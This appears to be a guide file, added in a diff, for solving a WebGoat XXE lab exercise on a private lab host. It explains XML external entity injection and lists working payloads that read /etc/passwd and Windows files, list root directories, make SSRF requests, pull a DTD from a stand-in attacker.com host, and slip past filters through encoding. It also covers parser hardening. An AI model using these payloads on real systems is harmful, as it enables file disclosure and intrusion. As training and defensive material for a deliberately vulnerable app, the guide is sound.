@@ -1,0 +1,268 @@
+====================================================================
+     XXE (XML External Entity) ATTACK - QUICK GUIDE
+====================================================================
+
+Challenge: Execute XXE injection via the comments field to list root directory
+
+Target: WebGoat XXE lesson at http://192.168.254.112:8001
+
+====================================================================
+WHAT IS XXE?
+====================================================================
+
+XXE (XML External Entity) injection exploits weakly configured XML parsers.
+
+Key Concept:
+- XML allows defining entities (like variables)
+- External entities can reference files/URLs
+- Vulnerable parsers will load and include these external resources
+- Attacker can read local files, perform SSRF, etc.
+
+====================================================================
+XXE ATTACK TYPES:
+====================================================================
+
+1. Classic XXE (In-band)
+   - External entity content appears in response
+   - Direct file disclosure
+
+2. Blind XXE (Out-of-band)
+   - No output in response
+   - Requires exfiltration via HTTP/DNS
+
+3. Error-based XXE
+   - Force parser errors to leak data
+
+====================================================================
+BASIC XXE PAYLOAD STRUCTURE:
+====================================================================
+
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+  <data>&xxe;</data>
+</root>
+
+Components:
+- DOCTYPE: Defines document type definition
+- ENTITY xxe: Defines external entity named "xxe"
+- SYSTEM: Specifies it's an external entity
+- file:///: File URI to read local files
+- &xxe;: References the entity (replaced with file content)
+
+====================================================================
+FOR THIS CHALLENGE - LIST ROOT DIRECTORY:
+====================================================================
+
+Target: List root directory (/)
+
+Windows:
+--------
+<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///c:/">]>
+
+Linux:
+------
+<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]>
+
+Full XML Payload:
+-----------------
+<?xml version="1.0"?>
+<!DOCTYPE comment [
+  <!ENTITY xxe SYSTEM "file:///">
+]>
+<comment>
+  <text>&xxe;</text>
+</comment>
+
+====================================================================
+STEP-BY-STEP SOLUTION:
+====================================================================
+
+Method 1: Using Browser DevTools (RECOMMENDED)
+----------------------------------------------
+
+1. Open WebGoat XXE lesson at:
+   http://192.168.254.112:8001
+
+2. Open Browser DevTools (F12)
+
+3. Go to Network tab
+
+4. Type any comment and submit the form
+
+5. Look at the request in Network tab
+   - Find the POST request
+   - Right-click → Copy → Copy as Fetch/cURL
+
+6. Modify the XML payload to include XXE:
+   - Replace the comment text with XXE payload
+   - Inject DOCTYPE before the root element
+
+7. Replay the request with modified XML
+
+
+Method 2: Using PowerShell Script
+----------------------------------
+
+See: xxe_attack.ps1 (created below)
+
+
+Method 3: Using Burp Suite/Proxy
+---------------------------------
+
+1. Intercept the comment POST request
+2. Modify the XML body
+3. Inject XXE payload
+4. Forward request
+
+====================================================================
+COMMON XXE PAYLOADS:
+====================================================================
+
+List root directory (Linux):
+---------------------------
+<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///">]>
+
+Read /etc/passwd (Linux):
+------------------------
+<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
+
+List C:\ drive (Windows):
+------------------------
+<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///c:/">]>
+
+Read Windows hosts file:
+-----------------------
+<!DOCTYPE comment [<!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">]>
+
+Network request (SSRF):
+----------------------
+<!DOCTYPE comment [<!ENTITY xxe SYSTEM "http://internal-server/">]>
+
+====================================================================
+EXAMPLE REQUEST FORMAT:
+====================================================================
+
+POST /WebGoat/xxe/simple HTTP/1.1
+Host: 192.168.254.112:8001
+Content-Type: application/xml
+Cookie: JSESSIONID=...
+
+<?xml version="1.0"?>
+<!DOCTYPE comment [
+  <!ENTITY xxe SYSTEM "file:///">
+]>
+<comment>
+  <text>&xxe;</text>
+</comment>
+
+====================================================================
+WHAT TO LOOK FOR IN RESPONSE:
+====================================================================
+
+Success indicators:
+- Directory listing appears in response
+- File contents visible in output
+- Lesson marks as complete
+- Flag value returned
+
+The response might show:
+bin/
+boot/
+dev/
+etc/
+home/
+root/
+usr/
+var/
+...
+
+====================================================================
+PROTECTING AGAINST XXE:
+====================================================================
+
+1. Disable External Entities
+   Java: factory.setFeature("http://xml.org/sax/features/external-general-entities", false);
+
+2. Disable DTD Processing
+   factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
+
+3. Use Simple Data Formats
+   - Prefer JSON over XML when possible
+
+4. Input Validation
+   - Validate and sanitize XML input
+   - Use XML schemas (XSD)
+
+5. Keep Libraries Updated
+   - Update XML parsers regularly
+
+====================================================================
+TROUBLESHOOTING:
+====================================================================
+
+Issue: "Parser doesn't process XXE"
+Solution: Try different entity types:
+  - SYSTEM entities
+  - PUBLIC entities
+  - Parameter entities
+
+Issue: "No output in response"
+Solution: May be blind XXE
+  - Try error-based XXE
+  - Use out-of-band techniques
+
+Issue: "Request blocked"
+Solution: Try encoding:
+  - URL encoding
+  - Base64 in data:// URIs
+
+Issue: "Wrong format"
+Solution: Check XML structure:
+  - Must be valid XML
+  - DOCTYPE must be inside XML doc
+  - Entity reference must match definition
+
+====================================================================
+ADVANCED XXE TECHNIQUES:
+====================================================================
+
+1. Parameter Entities (for blind XXE):
+-------------------------------------
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
+  %xxe;
+]>
+
+2. Error-based XXE:
+------------------
+<!DOCTYPE foo [
+  <!ENTITY % file SYSTEM "file:///etc/passwd">
+  <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
+  %eval;
+  %error;
+]>
+
+3. UTF-7 Encoding (bypass filters):
+----------------------------------
+<?xml version="1.0" encoding="UTF-7"?>
+
+====================================================================
+FILES CREATED:
+====================================================================
+
+xxe_attack.ps1          - PowerShell script for XXE attack
+xxe_guide.txt           - This guide
+xxe_payloads.txt        - Collection of XXE payloads
+
+====================================================================
+REFERENCES:
+====================================================================
+
+OWASP XXE: https://owasp.org/www-community/vulnerabilities/XML_External_Entity_(XXE)_Processing
+CWE-611: Improper Restriction of XML External Entity Reference
+PortSwigger: https://portswigger.net/web-security/xxe
+
+====================================================================
